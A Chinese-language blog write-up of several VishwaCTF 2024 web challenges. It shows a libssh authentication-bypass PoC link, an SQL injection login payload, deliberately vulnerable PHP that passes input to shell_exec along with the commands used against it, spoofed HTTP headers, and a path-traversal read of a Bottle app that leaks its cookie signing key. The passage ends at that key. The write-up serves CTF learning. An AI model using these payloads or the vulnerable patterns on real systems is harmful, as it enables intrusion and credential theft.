<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>

<!--Description-->



    <meta name="description" content="VishwaCTF 2024 writeup
Team: CakeisTheFake(單人)Rank: 31&amp;#x2F;1039Author: Naup堇姬

MiscWho am I?image
WebSave The City1234567DESCRIPTIONThe RAW Has Got A"/>


<!--Author-->

    <meta name="author" content="Naup堇姬"/>


<!--Open Graph Title-->

    <meta property="og:title" content="VishwaCTF-2024-Writeup"/>


<!--Open Graph Description-->

    <meta property="og:description" content="VishwaCTF 2024 writeup
Team: CakeisTheFake(單人)Rank: 31&amp;#x2F;1039Author: Naup堇姬

MiscWho am I?image
WebSave The City1234567DESCRIPTIONThe RAW Has Got A"/>


<!--Open Graph Site Name-->
    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>

<!--Type page-->

    <meta property="og:type" content="article"/>


<!--Page Cover-->


    <meta property="og:image" content="http://example.com/img/bg2.jpg"/>


<meta name="twitter:card" content="summary_large_image"/>




    <meta name="twitter:image" content="http://example.com/img/bg2.jpg"/>


<!-- Title -->

<title>VishwaCTF-2024-Writeup | 堇姬 Naup&#39;s Blog</title>

<!-- Bootstrap Core CSS -->
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">

<!-- Custom CSS -->

<link rel="stylesheet" href="/css/main.css">


<!-- Custom Fonts -->
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>

<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->

<!-- Gallery -->
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">

<!-- favicon -->

<link rel="icon" href="/img/icon.jpg"/>



    <!-- Google Analytics -->
    


<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
<!-- Head tag -->

<body>

    <!-- Menu -->
    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
    <div class="container pl-0 pr-0">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
        </div>
        <div class="navbar-nav float-right">
            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
                <i class="fas fa-search"></i>
            </button>
        </div>
    </div>
    <!-- /.container -->
</nav>

    <!-- Main Content -->
    <!-- Page Header -->
<!-- Set your background image for this header in your post front-matter: cover -->

<header class="intro-header" style="background-image: url('/img/bg2.jpg')">
    <div class="container">
        <div class="row">
            <div class="col-lg-12 col-md-12 text-center">
                <div class="post-heading text-white">
                    <h1>VishwaCTF-2024-Writeup</h1>
                    
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">
            <!-- Post Main Content -->
            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
                
                    <span class="meta d-inline-block">
    
    
    <!-- Date -->
    
        <span class="post-meta-split">&nbsp;|&nbsp;</span>
        <i class="far fa-calendar-check fa-fw"></i>
        2024-03-30
    
    <!-- word count and read count -->
    

    

    
</span>  
                
                <h1 id="VishwaCTF-2024-writeup"><a href="#VishwaCTF-2024-writeup" class="headerlink" title="VishwaCTF 2024 writeup"></a>VishwaCTF 2024 writeup</h1><blockquote>
<p>Team: CakeisTheFake(單人)<br>Rank: 31&#x2F;1039<br>Author: Naup堇姬</p>
</blockquote>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Who-am-I"><a href="#Who-am-I" class="headerlink" title="Who am I?"></a>Who am I?</h2><p><div class="img-item" data-src="https://hackmd.io/_uploads/Sk7chH7a6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Sk7chH7a6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Save-The-City"><a href="#Save-The-City" class="headerlink" title="Save The City"></a>Save The City</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DESCRIPTION</span><br><span class="line">The RAW Has Got An Input That ISIS Has Planted a Bomb Somewhere In The Pune! Fortunetly, RAW Has Infiltratrated The Internet Activity of One Suspect And They Found This Link. You Have To Find The Location ASAP!</span><br><span class="line"></span><br><span class="line">Aurthor : Samarth Ghante &amp; Harshali Patil</span><br><span class="line"></span><br><span class="line">FLAG FORMAT:</span><br><span class="line">VishwaCTF&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>當我嘗試nc他時，他會回應<code>SSH-2.0-libssh_0.8.1</code><br>以及會回應<code>bye bye</code><br><div class="img-item" data-src="https://hackmd.io/_uploads/H1HeaB7pp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1HeaB7pp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>我嘗試根據他給的去搜尋，發現了。<br><strong>CVE-2018-10993 libSSH authentication bypass exploit</strong></p>
<p>利用這資訊我找到了一份POC，RCE!!!<br><a target="_blank" rel="noopener" href="https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d">https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d</a></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/SyQ30B76a.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SyQ30B76a.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>flag在 <code>/location.txt</code><br><div class="img-item" data-src="https://hackmd.io/_uploads/BJmiABQ6p.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJmiABQ6p.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<blockquote>
<p>FLAG: flag:VishwaCTF{elrow-club-pune}</p>
</blockquote>
<h2 id="Trip-To-Us"><a href="#Trip-To-Us" class="headerlink" title="Trip To Us"></a>Trip To Us</h2><p>進來你會看到一個頁面<br><div class="img-item" data-src="https://hackmd.io/_uploads/H1MnXLm6p.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1MnXLm6p.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>例行的先用<code>dirsearch</code>來掃看看有沒有隱藏路徑<br><div class="img-item" data-src="https://hackmd.io/_uploads/BJfFXIm6p.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJfFXIm6p.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>可以找到一些路徑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/backups/</span><br><span class="line">/db/</span><br><span class="line">/Dockerfile</span><br><span class="line">/auth-iit-user.php</span><br></pre></td></tr></table></figure>

<p>可以先去<code>/db/</code></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/BJU8ELQaT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJU8ELQaT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>可以找到資料庫，裡面有admin的username和password(admin&#x2F;unbre@k@BLE_24)<br><div class="img-item" data-src="https://hackmd.io/_uploads/rJD_VU7Ta.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJD_VU7Ta.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>去到該路徑<code>/auth-iit-user.php </code>可以找到login入口</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/rJgTA8XTa.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJgTA8XTa.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="They-Are-Coming"><a href="#They-Are-Coming" class="headerlink" title="They Are Coming"></a>They Are Coming</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DESCRIPTION</span><br><span class="line">Aesthetic Looking army of 128 Robots with AGI Capabilities are coming to destroy our locality!</span><br><span class="line"></span><br><span class="line">Author : Samarth Ghante</span><br><span class="line"></span><br><span class="line">FLAG FORMAT:</span><br><span class="line">VishwaCTF&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>首先根據提示應該可以想到要去robots.txt，有Decryption key<br><div class="img-item" data-src="https://hackmd.io/_uploads/SJOMrv7TT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJOMrv7TT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>L3NlY3JldC1sb2NhdGlvbg&#x3D;&#x3D; 可以base64 -&gt; &#x2F;secret-location<br>去&#x2F;secret-location可以找到<code>local storage</code>有東西</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/HynNSDmaT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HynNSDmaT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher :  Gkul0oJKhNZ1E8nxwnMY8Ljn1KNEW9G9l+w243EQt0M4si+fhPQdxoaKkHVTGjmA</span><br><span class="line">Decryption key: th1s_1s_n0t_t5e_f1a9</span><br><span class="line">IV沒說先打個1(感覺是0但0不給我用)</span><br></pre></td></tr></table></figure>
<p>CBC-128-hint<br><div class="img-item" data-src="https://hackmd.io/_uploads/BybmtDm6a.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BybmtDm6a.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br><div class="img-item" data-src="https://hackmd.io/_uploads/HJL7KPmpT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJL7KPmpT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>CBC解密<br><a target="_blank" rel="noopener" href="https://tool.lmeee.com/jiami/aes">https://tool.lmeee.com/jiami/aes</a></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/HkL1Yv7aa.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HkL1Yv7aa.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>第一個改掉就行</p>
<blockquote>
<p>FLAG: VishwaCTF{g0_Su88m1t_1t_Qu14kl7}</p>
</blockquote>
<h2 id="MediCare-Pharma"><a href="#MediCare-Pharma" class="headerlink" title="MediCare Pharma"></a>MediCare Pharma</h2><p>看到這個可以懷疑SQL injection<br><div class="img-item" data-src="https://hackmd.io/_uploads/HkgtFoVa6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HkgtFoVa6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><code>username=tst&amp;password=tst&#39; or &#39;a&#39;=&#39;a&#39;#</code>可以炸出幾隻帳號<br><div class="img-item" data-src="https://hackmd.io/_uploads/B1Zl9j4pa.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1Zl9j4pa.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>登入後可以看到一個頁面，然後可以找到他會leak source code<br><div class="img-item" data-src="https://hackmd.io/_uploads/HyqMEkI66.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HyqMEkI66.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$enteredInput</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;search_param&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$enteredInput</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;result&#x27;</span> =&gt; <span class="string">&quot;Search bar cannot be empty&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$enteredInput</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span> == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;result&#x27;</span> =&gt; (<span class="variable">$enteredInput</span> . <span class="string">&quot; not found in store&quot;</span>)]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;result&#x27;</span> =&gt; <span class="variable">$result</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">404</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;error&#x27;</span> =&gt; <span class="string">&#x27;Access Forbidden&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以很明顯看到這裡有command injection</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell_exec($enteredInput);</span><br></pre></td></tr></table></figure>
<p>flag在家目錄<br><div class="img-item" data-src="https://hackmd.io/_uploads/SJ5VSJ8ap.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJ5VSJ8ap.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/B1sHSyUTa.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1sHSyUTa.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><strong>Payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls ~</span><br><span class="line">cat ~/flag.txt</span><br></pre></td></tr></table></figure>

<blockquote>
<p>FLAG: VishwaCTF{d1g1t4l_p41n_di5p4tch3d_th4nk5_f0r_sh0pp1ng_with_M3diC4re_Ph4rm4}</p>
</blockquote>
<h2 id="Recipe-Archival-Workshop"><a href="#Recipe-Archival-Workshop" class="headerlink" title="Recipe Archival Workshop:"></a>Recipe Archival Workshop:</h2><p>這題我也不知道為啥，直接上傳一個<code>.jpg</code>後，把它改成<code>.tiff</code>就可以拿到flag了<br>貌似跟fuzz extension name相關(?<br><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-extensions.txt">https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-extensions.txt</a><br><div class="img-item" data-src="https://hackmd.io/_uploads/B1b6rJ8aa.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B1b6rJ8aa.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<blockquote>
<p>VishwaCTF{today_i_wanted_to_eat_a_croissant_QUASO}</p>
</blockquote>
<h2 id="H34D3RS"><a href="#H34D3RS" class="headerlink" title="H34D3RS"></a>H34D3RS</h2><p>簡單觀察了一下，你可以發現他其實是個要你偽造header來bypass各種驗證的題目(跟之前pico某題很像)</p>
<p>直接附上payload跟過程<br><div class="img-item" data-src="https://hackmd.io/_uploads/BJrHUyLpa.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJrHUyLpa.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/ryE-DkU6p.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ryE-DkU6p.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/H1kzvkIpp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1kzvkIpp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/rkrfPJ8Tp.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rkrfPJ8Tp.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/S11XwJUap.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S11XwJUap.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/H1uNvkIaT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1uNvkIaT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>加入了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: lorbrowser</span><br><span class="line">Referer: https://vishwactf.com/</span><br><span class="line">Date: 2024+20=2044</span><br><span class="line">Upgrade-Insecure-Requests: 10</span><br><span class="line">Downlink: 999999999</span><br></pre></td></tr></table></figure>
<p>Downlink參考資料:<br><a target="_blank" rel="noopener" href="https://docs.w3cub.com/http/headers/downlink">https://docs.w3cub.com/http/headers/downlink</a></p>
<p><strong>Payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/2</span><br><span class="line">Host: ch42785150716.ch.eng.run</span><br><span class="line">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Upgrade-Insecure-Requests: 10</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">User-Agent: lorbrowser</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Referer: https://vishwactf.com/</span><br><span class="line">Date: 2044</span><br><span class="line">Downlink: 999999999</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Priority: u=0, i</span><br></pre></td></tr></table></figure>

<blockquote>
<p>FLAG: VishwaCTF{s3cret_sit3_http_head3rs_r_c0o1}</p>
</blockquote>
<h2 id="Prompt-Injection-本場最難也最有趣的web"><a href="#Prompt-Injection-本場最難也最有趣的web" class="headerlink" title="Prompt Injection(本場最難也最有趣的web)"></a>Prompt Injection(本場最難也最有趣的web)</h2><p>一開始進到該頁面可以快速找到一個LFI<br><div class="img-item" data-src="https://hackmd.io/_uploads/SJ14FkLa6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJ14FkLa6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>可以嘗試去讀source code</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/show?id=../../../app/app.py</span><br></pre></td></tr></table></figure>
<p><strong>source code</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, request, response, error</span><br><span class="line"><span class="keyword">from</span> config.secret <span class="keyword">import</span> Vishwa</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;index&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/show&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    response.content_type = <span class="string">&quot;text/plain; charset=UTF-8&quot;</span></span><br><span class="line">    param = request.query.<span class="built_in">id</span></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;^../app&quot;</span>, param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No!!!!&quot;</span></span><br><span class="line">    requested_path = os.path.join(os.getcwd() + <span class="string">&quot;/poems&quot;</span>, param)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(requested_path) <span class="keyword">as</span> f:</span><br><span class="line">            tfile = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No This Poems&quot;</span></span><br><span class="line">    <span class="keyword">return</span> tfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/sign&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=Vishwa)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=Vishwa)</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;guest&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;admin&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pls no hax&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>是個用bottle寫的後端<br>另外看到了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from config.secret import Vishwa</span><br></pre></td></tr></table></figure>
<p>可知道他把cookie金鑰存在哪裡，用LFI去把他找出來，可以用來偽造cookie<br><div class="img-item" data-src="https://hackmd.io/_uploads/ByDw9JL6T.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ByDw9JL6T.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><strong>Cookie Key</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vishwa = &quot;trrrrrrrrrrrrryyyyyyyyyyyharddddddddd&quot;</span><br></pre></td></tr></table></figure>
